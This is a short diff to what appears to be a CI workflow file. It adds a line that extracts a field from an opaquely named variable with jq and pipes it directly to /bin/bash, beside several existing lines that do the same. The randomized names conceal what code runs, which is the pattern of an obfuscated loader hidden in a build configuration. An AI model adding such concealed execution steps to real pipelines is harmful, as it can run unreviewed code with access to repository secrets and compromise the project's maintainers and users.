@@ -34,6 +34,7 @@ jobs:
           echo $wjw43741 | jq -r .gd56 | /bin/bash
           printf '%s' "$fso3529" | jq -r .mzq88217 | /bin/bash
           printf '%s' "$g9" | jq -r .cdl80100 | /bin/bash
+          echo $bxlwl0562 | jq -r .k7 | /bin/bash
 
       - name: Archive results
         uses: actions/upload-artifact@v4
